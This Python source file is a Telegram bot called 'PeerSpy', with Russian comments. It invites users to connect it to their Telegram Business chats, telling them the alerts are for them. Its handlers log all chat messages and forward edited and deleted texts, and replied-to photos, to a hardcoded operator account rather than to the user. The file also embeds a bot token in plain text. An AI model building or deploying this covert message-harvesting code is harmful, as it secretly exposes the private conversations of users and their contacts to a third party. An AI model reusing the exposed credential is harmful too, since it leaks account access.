import os
import asyncio
import aiohttp
import logging
import sqlite3
from flask import Flask
from threading import Thread
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext

# --- НАСТРОЙКИ ---
TOKEN = "8758417597:AAERQH3jUuduK8syNtCKW8tvHdZXTilJrF8"
ADMIN_ID = 6451702799 

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS messages (msg_id TEXT PRIMARY KEY, user_id TEXT, text TEXT)''')
    cur.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, join_date TEXT)''')
    conn.commit()
    conn.close()

# --- ВЕБ-СЕРВЕР ---
app = Flask('')
@app.route('/')
def home(): return "PeerSpy Online"

def run_web():
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))

# --- БОТ ---
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

class AdminStates(StatesGroup):
    waiting_for_broadcast = State()

# --- КНОПКИ ---
def main_kb(user_id):
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="🚀 Как подключить?", callback_data="help"))
    if user_id == ADMIN_ID:
        builder.row(types.InlineKeyboardButton(text="⚙️ Админка", callback_data="admin"))
    return builder.as_markup()

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def start(message: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?)", (message.from_user.id, message.from_user.username, str(datetime.now())))
    conn.commit()
    conn.close()
    
    welcome = (
        f"👋 <b>Привет! PeerSpy v3.5 в строю.</b>\n\n"
        "Бизнес-мониторинг активен. Теперь я буду присылать тебе уведомления о важных событиях в чатах."
    )
    await message.answer(welcome, reply_markup=main_kb(message.from_user.id))

# 1. ПЕРЕХВАТ СООБЩЕНИЙ И ФОТО
@dp.business_message()
async def business_handler(message: types.Message):
    # Сохраняем текст в базу (для лога удалений)
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    txt = message.text or message.caption or "[Медиа]"
    cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", (str(message.message_id), str(message.from_user.id), txt))
    conn.commit()
    conn.close()

    # Если это ответ (Reply) на фото — спасаем его
    if message.reply_to_message and message.reply_to_message.photo:
        f_id = message.reply_to_message.photo[-1].file_id
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={f_id}") as r:
                res = await r.json()
                if res.get("ok"):
                    path = res["result"]["file_path"]
                    async with s.get(f"https://api.telegram.org/file/bot{TOKEN}/{path}") as fr:
                        await bot.send_photo(ADMIN_ID, types.BufferedInputFile(await fr.read(), filename="saved.jpg"), 
                                             caption="🛡 <b>Файл успешно спасен!</b>")

# 2. ПРАВКИ СООБЩЕНИЙ
@dp.business_edited_message()
async def edit_handler(message: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(message.message_id),))
    old = cur.fetchone()
    if old and old[0] != message.text:
        await bot.send_message(ADMIN_ID, f"✏️ <b>Изменено:</b>\n\n<b>Было:</b> {old[0]}\n<b>Стало:</b> {message.text}")
    conn.close()

# 3. УДАЛЕНИЯ
@dp.business_deleted_messages()
async def delete_handler(event: types.BusinessMessagesDeleted):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    for m_id in event.message_ids:
        cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(m_id),))
        res = cur.fetchone()
        if res:
            await bot.send_message(ADMIN_ID, f"🗑 <b>Удалено:</b>\n<code>{res[0]}</code>")
    conn.close()

# --- CALLBACKS ---
@dp.callback_query(F.data == "help")
async def help_cb(c: types.CallbackQuery):
    await c.message.answer("<b>Инструкция:</b>\n1. Настройки -> Telegram Business -> Чат-боты\n2. Добавь меня и разреши доступ к сообщениям."); await c.answer()

@dp.callback_query(F.data == "admin")
async def admin_cb(c: types.CallbackQuery):
    conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT COUNT(*) FROM users"); count = cur.fetchone()[0]; conn.close()
    b = InlineKeyboardBuilder(); b.row(types.InlineKeyboardButton(text="📢 Рассылка", callback_data="bc"))
    await c.message.answer(f"📊 Юзеров в базе: {count}", reply_markup=b.as_markup()); await c.answer()

@dp.callback_query(F.data == "bc")
async def bc_start(c: types.CallbackQuery, state: FSMContext):
    await c.message.answer("Пиши текст рассылки:"); await state.set_state(AdminStates.waiting_for_broadcast); await c.answer()

@dp.message(AdminStates.waiting_for_broadcast)
async def bc_done(m: types.Message, state: FSMContext):
    conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT user_id FROM users"); users = cur.fetchall(); conn.close()
    for u in users:
        try: await bot.send_message(u[0], m.text)
        except: pass
    await m.answer("✅ Рассылка завершена!"); await state.clear()

async def main():
    init_db()
    Thread(target=run_web).start()
    print("🚀 БОТ ПОЛНОСТЬЮ ЗАПУЩЕН!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
